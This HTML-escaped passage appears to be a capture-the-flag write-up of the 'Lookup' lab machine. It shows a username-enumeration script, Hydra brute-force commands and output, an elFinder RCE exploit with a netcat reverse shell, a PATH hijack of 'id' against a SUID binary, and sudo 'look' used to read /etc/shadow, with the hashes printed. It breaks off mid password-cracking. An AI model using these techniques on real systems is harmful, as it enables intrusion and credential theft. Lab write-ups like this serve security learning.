class=&quot;string&quot;&gt;&apos;application/x-www-form-urlencoded&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Content-Length&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;33&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Origin&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;http://lookup.thm&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Connection&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;keep-alive&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Referer&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;http://lookup.thm/&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Upgrade-Insecure-Requests&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;br&gt;   }&lt;br&gt;   &lt;br&gt;   myobj = {&lt;span class=&quot;string&quot;&gt;&apos;username&apos;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&apos;password&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;testpass&apos;&lt;/span&gt;}&lt;br&gt;   x = requests.post(url, data=myobj, headers=headers)&lt;br&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Wrong username&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not in&lt;/span&gt; x.text:&lt;br&gt;       print(username)&lt;br&gt;       exit()&lt;br&gt;&lt;br&gt;f = open(sys.argv[1], &lt;span class=&quot;string&quot;&gt;&apos;r&apos;&lt;/span&gt;)&lt;br&gt;usernames = f.read().splitlines()&lt;br&gt;num_threads = 10&lt;br&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;test_usernames_in_batches&lt;/span&gt;(usernames, num_threads):&lt;br&gt;   &lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; ThreadPoolExecutor(max_workers=num_threads) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; executor:&lt;br&gt;       &lt;span class=&quot;comment&quot;&gt;# Submit all tasks in chunks to avoid memory overload&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(0, len(usernames), num_threads):&lt;br&gt;           batch = usernames[i:i + num_threads]&lt;br&gt;           futures = {executor.submit(userenum, username): username &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; username &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; batch}&lt;br&gt;&lt;br&gt;           &lt;span class=&quot;comment&quot;&gt;# Process results as they complete&lt;/span&gt;&lt;br&gt;           &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; future &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; as_completed(futures):&lt;br&gt;               username = futures[future]&lt;br&gt;               &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;br&gt;                   future.result()  &lt;span class=&quot;comment&quot;&gt;# To raise any exceptions if they occurred&lt;/span&gt;&lt;br&gt;               &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt; Exception &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; e:&lt;br&gt;                   print(&lt;span class=&quot;string&quot;&gt;f&quot;Error processing {username}: {e}&quot;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;test_usernames_in_batches(usernames, num_threads)&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;For this code, I took help from ChatGPT because the first version was single-threaded and it was very slow, I didn&apos;t how to create more threads. &lt;span style=&quot;color:#FFC107&quot;&gt;Note that ChatGPT or similar AIs are banned during OSCP and may be the same for other certifications as well. During this box, I didn&apos;t know that.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;After quite a bit my script found a username, &lt;b&gt;jose&lt;/b&gt;. Now I can proceed to brute force Jose&apos;s password with Hydra using &lt;i&gt;rockyou.txt&lt;/i&gt; wordlist.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/jose.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The command I executed is:&lt;br&gt;&lt;code&gt;$ hydra -l jose -P /usr/share/wordlists/rockyou.txt -f -V lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V&lt;/code&gt;&lt;p&gt;&lt;pre&gt;$ hydra -l jose -P /usr/share/wordlists/rockyou.txt -f -V lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V&lt;br&gt;Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).&lt;br&gt;&lt;br&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-29 20:44:18&lt;br&gt;[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task&lt;br&gt;[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&amp;password=^PASS^:Wrong&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;123456&quot; - 1 of 14344399 [child 0] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;12345&quot; - 2 of 14344399 [child 1] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;123456789&quot; - 3 of 14344399 [child 2] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;password&quot; - 4 of 14344399 [child 3] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;iloveyou&quot; - 5 of 14344399 [child 4] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;princess&quot; - 6 of 14344399 [child 5] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;1234567&quot; - 7 of 14344399 [child 6] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;rockyou&quot; - 8 of 14344399 [child 7] (0/0)&lt;br&gt;&lt;br&gt;[...SNIPPED...]&lt;br&gt;&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;sniper&quot; - 1413 of 14344399 [child 14] (0/0)&lt;br&gt;[ATTEMPT] target lookup.thm - login &quot;jose&quot; - pass &quot;erica&quot; - 1414 of 14344399 [child 6] (0/0)&lt;br&gt;[&lt;b&gt;80&lt;/b&gt;][&lt;b&gt;http-post-form&lt;/b&gt;] host: &lt;b&gt;lookup.thm&lt;/b&gt;   login: &lt;b&gt;jose&lt;/b&gt;   password: &lt;b&gt;password123&lt;/b&gt;&lt;br&gt;[STATUS] attack finished for lookup.thm (valid pair found)&lt;br&gt;1 of 1 target successfully completed, 1 valid password found&lt;br&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-29 20:41:28&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now let&apos;s try to attemp a login with this credentials &lt;b&gt;jose&lt;/b&gt;:&lt;b&gt;passowrd123&lt;/b&gt;.&lt;/p&gt;&lt;p&gt;Once successfully logged in I am inside an application called Elffinder.&lt;/p&gt;&lt;blockquote&gt;elFinder is an open-source file manager for web, written in JavaScript using jQuery UI. Creation is inspired by simplicity and convenience of Finder program used in Mac OS X operating system.&lt;/blockquote&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/elfinder.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;I inspected different files I was able to access and found different information such as names, but nothing interesting they seemed not useful in this situation&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/usertxt.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The second thing was to check the version of the application by clicking on the &lt;b&gt;?&lt;/b&gt; question mark icon.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/elfinderinfoicon.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/elfinderversion.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;A quick search on Google shows that the version is vulnerable. I tried many of the available exploits but ended up being able to successfully get a shell with this one from &lt;a href=&quot;https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce/blob/main/exploit.py&quot;&gt;GitHub&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/exploitsearch.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;I set my listener with NetCat as &lt;code&gt;nc -lvnp 4444&lt;/code&gt; and run the exploit as &lt;code&gt;python3 ./exploit.py.1 -t http://files.lookup.thm/elFinder/ -lh 10.21.112.161 -lp 4444&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/runexploit.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/revshell.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As a user &lt;i&gt;www-data&lt;/i&gt; I am not able to access the user flag, I must become user &lt;i&gt;think&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /home&lt;br&gt;cd /home&lt;br&gt;www-data@lookup:/home$ ls&lt;br&gt;ls&lt;br&gt;think&lt;br&gt;www-data@lookup:/home$ cd /think&lt;br&gt;cd /think&lt;br&gt;bash: cd: /think: No such file or directory&lt;br&gt;www-data@lookup:/home$ ls think  &lt;br&gt;ls think&lt;br&gt;user.txt&lt;br&gt;www-data@lookup:/home$ cat ./think/user.txt&lt;br&gt;cat ./think/user.txt&lt;br&gt;cat: ./think/user.txt: Permission denied&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now that I have the shell it is time to privilege escalation.The first thing I check once I have a shell is the command the current user can run as sudo, and for that, I use &lt;code&gt;sudo -l&lt;/code&gt;. In this case, it is giving me an error which I honestly don&apos;t know what is it.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/sudoerror.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The next step is to check what users are available in the system as the &lt;i&gt;www-data&lt;/i&gt; user al always limited in actions. Maybe other real users are less limited and are able to run more commands, and hopefully with sudo privileges. To check the available users in the system I run the following command &lt;code&gt;cat /etc/passwd | grep /bin/bash&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/systemusers.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;There are only 2 users in the system, root and &lt;i&gt;think&lt;/i&gt;.&lt;p&gt;&lt;p&gt;Now I have to do lateral movement and compromise &lt;i&gt;think&lt;/i&gt; and access as &lt;i&gt;think&lt;/i&gt; user. Continuing my enumeration the next step is what program I can run with SUID. At this point, I do not know what will lead me in the right direction I am just following a &lt;a href=&quot;https://github.com/intotheewild/OSCP-Checklist/blob/main/03a.%20Linux%20Privilege%20Escalation.md&quot;&gt;Linux Privilege Escalation&lt;/a&gt; checklist found on Google used for the OSCP exam, kind of blindly.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ find / -perm -u=s -type f 2&gt;/dev/null&lt;br&gt;&amp;lt;elFinder/php$ find / -perm -u=s -type f 2&gt;/dev/null&lt;br&gt;/snap/snapd/19457/usr/lib/snapd/snap-confine&lt;br&gt;/snap/core20/1950/usr/bin/chfn&lt;br&gt;/snap/core20/1950/usr/bin/chsh&lt;br&gt;/snap/core20/1950/usr/bin/gpasswd&lt;br&gt;/snap/core20/1950/usr/bin/mount&lt;br&gt;/snap/core20/1950/usr/bin/newgrp&lt;br&gt;/snap/core20/1950/usr/bin/passwd&lt;br&gt;/snap/core20/1950/usr/bin/su&lt;br&gt;/snap/core20/1950/usr/bin/sudo&lt;br&gt;/snap/core20/1950/usr/bin/umount&lt;br&gt;/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;br&gt;/snap/core20/1950/usr/lib/openssh/ssh-keysign&lt;br&gt;/snap/core20/1974/usr/bin/chfn&lt;br&gt;/snap/core20/1974/usr/bin/chsh&lt;br&gt;/snap/core20/1974/usr/bin/gpasswd&lt;br&gt;/snap/core20/1974/usr/bin/mount&lt;br&gt;/snap/core20/1974/usr/bin/newgrp&lt;br&gt;/snap/core20/1974/usr/bin/passwd&lt;br&gt;/snap/core20/1974/usr/bin/su&lt;br&gt;/snap/core20/1974/usr/bin/sudo&lt;br&gt;/snap/core20/1974/usr/bin/umount&lt;br&gt;/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;br&gt;/snap/core20/1974/usr/lib/openssh/ssh-keysign&lt;br&gt;/usr/lib/policykit-1/polkit-agent-helper-1&lt;br&gt;/usr/lib/openssh/ssh-keysign&lt;br&gt;/usr/lib/eject/dmcrypt-get-device&lt;br&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;br&gt;/usr/sbin/pwm&lt;br&gt;/usr/bin/at&lt;br&gt;/usr/bin/fusermount&lt;br&gt;/usr/bin/gpasswd&lt;br&gt;/usr/bin/chfn&lt;br&gt;/usr/bin/sudo&lt;br&gt;/usr/bin/chsh&lt;br&gt;/usr/bin/passwd&lt;br&gt;/usr/bin/mount&lt;br&gt;/usr/bin/su&lt;br&gt;/usr/bin/newgrp&lt;br&gt;/usr/bin/pkexec&lt;br&gt;/usr/bin/umount&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;What caught my eye was the program &lt;b&gt;/usr/sbin/pwm&lt;/b&gt;, it is an uncommon program that never found in my previous challenges, but it is worth looking into by runnig it.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm&lt;br&gt;&amp;lt;.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm&lt;br&gt;[!] Running &apos;id&apos; command to extract the username and user ID (UID)&lt;br&gt;[!] ID: www-data&lt;br&gt;[-] File /home/www-data/.passwords not found&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Very interesting! It runs the command &lt;b&gt;Id&lt;/b&gt; that outputs something like this &lt;i&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/i&gt; to find the username and try to access the home directory by crafting the path with the name extracted from the command &lt;b&gt;Id&lt;b&gt;.&lt;/p&gt;&lt;p&gt;Giving a quick look at the home directory I can see that www-data has no home folder so the program &lt;b&gt;/usr/sbin/pwm&lt;/b&gt; can&apos;t access such a folder. But the think do have a home folder. Only if I could provide the &lt;i&gt;think&lt;/i&gt; user&apos;s &lt;b&gt;Id&lt;/b&gt; instead of &lt;i&gt;www-data&lt;/i&gt;...&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/meme.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;To go further I have to understand how Linux programs are executed from the terminal. The question to ask is: how does the terminal know where the program is when I write the name in the terminal like id, pwd, ls etc.? It uses a variable called PATH that lists a series of folder to check if they contains any program with the spcified name.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ echo $PATH&lt;br&gt;&amp;lt;les.lookup.thm/public_html/elFinder/php$ echo $PATH                &lt;br&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;in this case the search paths are &lt;i&gt;/usr/local/sbin&lt;/i&gt;, &lt;i&gt;/usr/local/bin&lt;/i&gt;, &lt;i&gt;/usr/sbin&lt;/i&gt;, &lt;i&gt;/usr/bin&lt;/i&gt;, &lt;i&gt;/sbin&lt;/i&gt;, &lt;i&gt;/bin&lt;/i&gt;, and the first match will be executed as it check these folder in order. Each user has their own list of paths stored in the PATH variable. This means different users can have different paths where the system looks for programs. If a new path is added at the beginning of the list, the system will check that path first before looking at others. If it finds the program there, it won’t check the rest of the paths. This can be used to trick the system. For example, if someone adds a fake version of a command (like id) in a path that comes first, the system will run that fake command instead of the real one. The path I am going to use is &lt;i&gt;/tmp&lt;/i&gt; as it is unresticted and I have read and write permission.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ export PATH=/tmp:$PATH&lt;br&gt;&amp;lt;hm/public_html/elFinder/php$ export PATH=/tmp:$PATH                &lt;br&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ echo $PATH&lt;br&gt;&amp;lt;les.lookup.thm/public_html/elFinder/php$ echo $PATH                &lt;br&gt;/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now that &lt;i&gt;/tmp&lt;/i&gt; is at the beginning of the &lt;b&gt;PATH&lt;/b&gt;, if a program named &lt;b&gt;id&lt;/b&gt; exists there, it will run instead of the real one. The idea is to create a new id program that gives as output the id of the user think instead of &lt;i&gt;www-data&lt;/i&gt;. So first of all I need to know what the output of the real id of the user think is.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /tmp&lt;br&gt;cd /tmp&lt;br&gt;www-data@lookup:/tmp$ id think&lt;br&gt;id think&lt;br&gt;uid=1000(think) gid=1000(think) groups=1000(think)&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now that we know the output of the &lt;b&gt;id&lt;/b&gt; command of think user I can craft the simple bash program to give the exact same output.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;echo -e &apos;#!/usr/bin/bash\necho &quot;uid=1000(think) gid=1000(think) groups=1000(think)&quot;&apos; &gt; id&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now by running the program &lt;b&gt;/usr/sbin/pwm&lt;/b&gt; I have a whole different output and it looks like a password wordlist.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;www-data@lookup:/tmp$ /usr/sbin/pwm&lt;br&gt;/usr/sbin/pwm&lt;br&gt;[!] Running &apos;id&apos; command to extract the username and user ID (UID)&lt;br&gt;[!] ID: think&lt;br&gt;jose1006&lt;br&gt;jose1004&lt;br&gt;jose1002&lt;br&gt;jose1001teles&lt;br&gt;jose100190&lt;br&gt;jose10001&lt;br&gt;jose10.asd&lt;br&gt;jose10+&lt;br&gt;jose0_07&lt;br&gt;jose0990&lt;br&gt;jose0986$&lt;br&gt;jose098130443&lt;br&gt;jose0981&lt;br&gt;jose0924&lt;br&gt;jose0923&lt;br&gt;jose0921&lt;br&gt;thepassword&lt;br&gt;jose(1993)&lt;br&gt;jose&apos;sbabygurl&lt;br&gt;jose&amp;vane&lt;br&gt;jose&amp;takie&lt;br&gt;jose&amp;samantha&lt;br&gt;jose&amp;pam&lt;br&gt;jose&amp;jlo&lt;br&gt;jose&amp;jessica&lt;br&gt;jose&amp;jessi&lt;br&gt;josemario.AKA(think)&lt;br&gt;jose.medina.&lt;br&gt;jose.mar&lt;br&gt;jose.luis.24.oct&lt;br&gt;jose.line&lt;br&gt;jose.leonardo100&lt;br&gt;jose.leas.30&lt;br&gt;jose.ivan&lt;br&gt;jose.i22&lt;br&gt;jose.hm&lt;br&gt;jose.hater&lt;br&gt;jose.fa&lt;br&gt;jose.f&lt;br&gt;jose.dont&lt;br&gt;jose.d&lt;br&gt;jose.com}&lt;br&gt;jose.com&lt;br&gt;jose.chepe_06&lt;br&gt;jose.a91&lt;br&gt;jose.a&lt;br&gt;jose.96.&lt;br&gt;jose.9298&lt;br&gt;jose.2856171&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;Now the only other application that is left to compromise is the SSH. So I will try brute-forcing the think user&apos;s password with the wordlist found. But first I will save this list in a file on my local computer just by copy-pasting it from the terminal.&lt;p&gt;Now the only other application that is left to compromise is the SSH. So I will try brute-forcing the think user&apos;s password with the wordlist found. But first I will save this list in a file on my local computer just by copy-pasting it from the terminal and naming the file &quot;thinkoutput&quot;. &lt;code&gt;hydra -l think -P ./thinkoutput 10.10.99.62 ssh -t 20&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ hydra -l think -P ./thinkoutput 10.10.99.62 ssh -t 20&lt;br&gt;Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).&lt;br&gt;&lt;br&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-30 09:14:51&lt;br&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;br&gt;[DATA] max 20 tasks per 1 server, overall 20 tasks, 50 login tries (l:1/p:50), ~3 tries per task&lt;br&gt;[DATA] attacking ssh://10.10.99.62:22/&lt;br&gt;[&lt;b&gt;22&lt;/b&gt;][&lt;b&gt;ssh&lt;/b&gt;] host: &lt;b&gt;10.10.99.62&lt;/b&gt;   login: &lt;b&gt;think&lt;/b&gt;   password: &lt;b&gt;josemario.AKA(think)&lt;/b&gt;&lt;br&gt;1 of 1 target successfully completed, 1 valid password found&lt;br&gt;[WARNING] Writing restore file because 3 final worker threads did not complete until end.&lt;br&gt;[ERROR] 3 targets did not resolve or could not be connected&lt;br&gt;[ERROR] 0 target did not complete&lt;br&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-30 09:14:58&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I can now log in as user think via SSH. &lt;code&gt;ssh think@10.10.99.62&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ ssh think@10.10.99.62&lt;br&gt;The authenticity of host &apos;10.10.99.62 (10.10.99.62)&apos; can&apos;t be established.&lt;br&gt;ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.&lt;br&gt;This host key is known by the following other names/addresses:&lt;br&gt;    ~/.ssh/known_hosts:6: [hashed name]&lt;br&gt;    ~/.ssh/known_hosts:7: [hashed name]&lt;br&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes&lt;br&gt;Warning: Permanently added &apos;10.10.99.62&apos; (ED25519) to the list of known hosts.&lt;br&gt;think@10.10.99.62&apos;s password: &lt;br&gt;Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)&lt;br&gt;&lt;br&gt; * Documentation:  https://help.ubuntu.com&lt;br&gt; * Management:     https://landscape.canonical.com&lt;br&gt; * Support:        https://ubuntu.com/advantage&lt;br&gt;&lt;br&gt;  System information as of Thu 30 Jan 2025 02:19:12 PM UTC&lt;br&gt;&lt;br&gt;  System load:  0.0               Processes:             131&lt;br&gt;  Usage of /:   59.7% of 9.75GB   Users logged in:       0&lt;br&gt;  Memory usage: 23%               IPv4 address for ens5: 10.10.99.62&lt;br&gt;  Swap usage:   0%&lt;br&gt;&lt;br&gt;&lt;br&gt;Expanded Security Maintenance for Applications is not enabled.&lt;br&gt;&lt;br&gt;7 updates can be applied immediately.&lt;br&gt;To see these additional updates run: apt list --upgradable&lt;br&gt;&lt;br&gt;Enable ESM Apps to receive additional future security updates.&lt;br&gt;See https://ubuntu.com/esm or run: sudo pro status&lt;br&gt;&lt;br&gt;&lt;br&gt;The list of available updates is more than a week old.&lt;br&gt;To check for new updates run: sudo apt update&lt;br&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;br&gt;&lt;br&gt;&lt;br&gt;Last login: Sun May 12 12:07:25 2024 from 192.168.14.1&lt;br&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ &lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;As user &lt;i&gt;think&lt;/i&gt; I am able to retrieve the user flag.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ ls&lt;br&gt;user.txt&lt;br&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ cat user.txt &lt;br&gt;38375fb4dd8baa2b2039ac03d92b820e&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The first enumeration I always perform as mentioned earlier is to check what command the user can run as sudo, I do that by running &lt;code&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ sudo -l&lt;br&gt;[sudo] password for think:&lt;br&gt;Matching Defaults entries for think on lookup:&lt;br&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;br&gt;&lt;br&gt;User think may run the following commands on lookup:&lt;br&gt;    (ALL) /usr/bin/look&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The user think can run the command &lt;b&gt;look&lt;/b&gt; in &lt;b&gt;/usr/bin/look&lt;/b&gt; with sudo privilege. At the time of doing this box, I never encountered this program. My only hope is that &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; has the commands to exploit it. Luckily it has the &lt;a href=&quot;https://gtfobins.github.io/gtfobins/look/&quot;&gt;exploit&lt;/a&gt; for the command look and I can read arbitrary files. Follwing the commands to execute to read arbitrary files.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;LFILE=file_to_read&lt;br&gt;sudo look &apos;&apos; &quot;$LFILE&quot;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;The first thing I tried to read was the file &lt;i&gt;/etc/shadow&lt;/i&gt; and attempted to crack the password.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ LFILE=/etc/shadow&lt;br&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ sudo look &apos;&apos; &quot;$LFILE&quot;&lt;br&gt;root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::&lt;br&gt;daemon:*:19046:0:99999:7:::&lt;br&gt;bin:*:19046:0:99999:7:::&lt;br&gt;sys:*:19046:0:99999:7:::&lt;br&gt;sync:*:19046:0:99999:7:::&lt;br&gt;games:*:19046:0:99999:7:::&lt;br&gt;man:*:19046:0:99999:7:::&lt;br&gt;lp:*:19046:0:99999:7:::&lt;br&gt;mail:*:19046:0:99999:7:::&lt;br&gt;news:*:19046:0:99999:7:::&lt;br&gt;uucp:*:19046:0:99999:7:::&lt;br&gt;proxy:*:19046:0:99999:7:::&lt;br&gt;www-data:*:19046:0:99999:7:::&lt;br&gt;backup:*:19046:0:99999:7:::&lt;br&gt;list:*:19046:0:99999:7:::&lt;br&gt;irc:*:19046:0:99999:7:::&lt;br&gt;gnats:*:19046:0:99999:7:::&lt;br&gt;nobody:*:19046:0:99999:7:::&lt;br&gt;systemd-network:*:19046:0:99999:7:::&lt;br&gt;systemd-resolve:*:19046:0:99999:7:::&lt;br&gt;systemd-timesync:*:19046:0:99999:7:::&lt;br&gt;messagebus:*:19046:0:99999:7:::&lt;br&gt;syslog:*:19046:0:99999:7:::&lt;br&gt;_apt:*:19046:0:99999:7:::&lt;br&gt;tss:*:19046:0:99999:7:::&lt;br&gt;uuidd:*:19046:0:99999:7:::&lt;br&gt;tcpdump:*:19046:0:99999:7:::&lt;br&gt;landscape:*:19046:0:99999:7:::&lt;br&gt;pollinate:*:19046:0:99999:7:::&lt;br&gt;usbmux:*:19510:0:99999:7:::&lt;br&gt;sshd:*:19510:0:99999:7:::&lt;br&gt;systemd-coredump:!!:19510::::::&lt;br&gt;lxd:!:19510::::::&lt;br&gt;think:$6$Cqt14LKfnwO1hA/a$c/g4M9yiP1KGJtbiOS4zubpw2.sm4bPfCglqddPpUS615xwwsU4eg1q.nr6UDLppea8AlmJ5fQUUewLICNU371:19568:0:99999:7:::&lt;br&gt;fwupd-refresh:*:19510:0:99999:7:::&lt;br&gt;mysql:!:19568:0:99999:7:::&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;First step is to save the hash in a file that I named &quot;hash&quot;, &lt;br&gt;&lt;code&gt;echo &quot;root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::&quot; &gt; hash&lt;/code&gt;.&lt;p&gt;&lt;pre&gt;$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash&lt;br&gt;Using default input encoding: UTF-8&lt;br&gt;Loaded 1 password hash 